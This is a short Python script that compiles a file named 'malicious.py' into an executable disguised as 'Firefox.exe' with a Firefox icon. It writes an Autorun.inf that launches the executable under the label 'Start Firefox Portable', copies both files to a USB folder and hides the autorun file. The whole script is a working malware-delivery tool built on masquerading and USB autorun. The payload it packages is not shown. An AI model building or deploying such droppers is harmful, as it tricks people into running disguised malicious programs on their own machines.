import PyInstaller.__main__
import shutil
import os

#Works better in cmd than in IDE

filename = "malicious.py"
exename = "Firefox.exe"
icon = "Firefox.ico"
pwd = os.getcwd()
usbdir = os.path.join(pwd, "USB")

print("Path ", usbdir)

if os.path.isfile(exename):
    os.remove(exename)

print("Creating EXE")

#Create executable from Python script
PyInstaller.__main__.run([
    "malicious.py",
    "--onefile",
    "--clean",
    "--log-level=ERROR",
    "--name="+exename,
    "--icon="+icon
 ])

print("EXE Created")

#Cleanup the installer
shutil.move(os.path.join(pwd,"dist",exename),pwd)
shutil.rmtree("dist")
shutil.rmtree("build")
shutil.rmtree("__pycache__")
os.remove(exename+".spec")

print("Creating Autorun file")

#Create autorun file
with open("Autorun.inf", "w") as o:
    o.write("(Autorun)\n")
    o.write("Open="+exename+"\n")
    o.write("Action=Start Firefox Portable\n")
    o.write("Label=My USB\n")
    o.write("Icon="+exename+"\n")

print("Setting up USB")

#Move files to USB and set to hidden

shutil.move(exename,usbdir)
shutil.move("Autorun.inf", usbdir)
print("attrib +h "+os.path.join(usbdir,"Autorun.inf"))
os.system("attrib +h "+os.path.join(usbdir,"Autorun.inf"))